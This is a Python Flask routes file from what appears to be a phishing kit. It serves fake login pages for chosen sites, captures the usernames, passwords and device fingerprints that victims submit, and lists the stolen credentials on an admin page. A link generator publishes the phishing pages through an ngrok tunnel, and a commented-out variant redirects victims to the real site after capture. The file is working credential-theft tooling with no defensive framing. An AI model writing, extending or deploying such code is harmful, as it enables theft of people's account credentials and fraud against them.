import json
import logging
from flask import Blueprint, render_template, request, redirect, url_for, current_app
from core.utils import save_credentials, fingerprint, load_json_credentials, load_db_credentials
from flask import jsonify
bp = Blueprint('main', __name__)

# Set up logging for routes (errors will be logged to console)
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")


@bp.route('/')
def index():
    try:
        print("Rendering index.html")  # Debug print
        return render_template('index.html')
        # return render_template('index.html')
    except Exception as e:
        # print("Error rendering index.html:", e)
        logging.exception("Error rendering index.html")
        return "An error occurred", 500


@bp.route('/admin')
def admin():
    try:
        storage_type = current_app.config.get('STORAGE_TYPE')
        if storage_type == 'json':
            credentials = load_json_credentials()
        else:
            credentials = load_db_credentials()
        return render_template('admin.html', credentials=credentials)
    except Exception as e:
        logging.exception("Error loading admin panel")
        return "An error occurred", 500


# @bp.route('/phishing/<site>', methods=['GET', 'POST'])
# def phishing(site):
#     if request.method == 'POST':
#         try:
#             username = request.form.get('username')
#             password = request.form.get('password')
#             user_agent = request.headers.get('User-Agent')
#             device_info = fingerprint(user_agent)  # Get basic device info
#             save_credentials(username, password, device_info)
#         except Exception as e:
#             logging.exception("Error saving credentials")
#         # Optionally add a delay here (or use background processing) before redirecting
#         return redirect("https://www." + site + ".com")  # Redirect to the legitimate site after capture
#     return render_template(f"phishing/{site}.html")

@bp.route('/phishing/<site>', methods=['GET', 'POST'])
def phishing(site):
    if request.method == 'POST':
        try:
            username = request.form.get('username')
            password = request.form.get('password')
            user_agent = request.headers.get('User-Agent')
            device_info = fingerprint(user_agent)  # Get basic device info
            # Pass 'site' to save_credentials so we record which template was used
            save_credentials(username, password, device_info, site)
        except Exception as e:
            logging.exception("Error saving credentials")
        # Instead of redirecting immediately, show the loading page
        return render_template("loading.html", site=site)
    return render_template(f"phishing/{site}.html")


@bp.route('/generate_link', methods=['POST'])
def generate_link():
    template = request.form.get('template')
    hosting = request.form.get('hosting')
    if hosting == 'local':
        # Generate a local URL; _external=True to return full URL
        link = url_for('main.phishing', site=template, _external=True)
    elif hosting == 'cloud':
        # Call tunneling function; here we use 'ngrok' as an example.
        from tunnels import start_tunnel
        public_url = start_tunnel('ngrok')  # This returns a placeholder public URL
        # Append the phishing path to the public URL
        link = public_url + url_for('main.phishing', site=template)
    else:
        link = url_for('main.phishing', site=template, _external=True)
    return jsonify({"link": link})
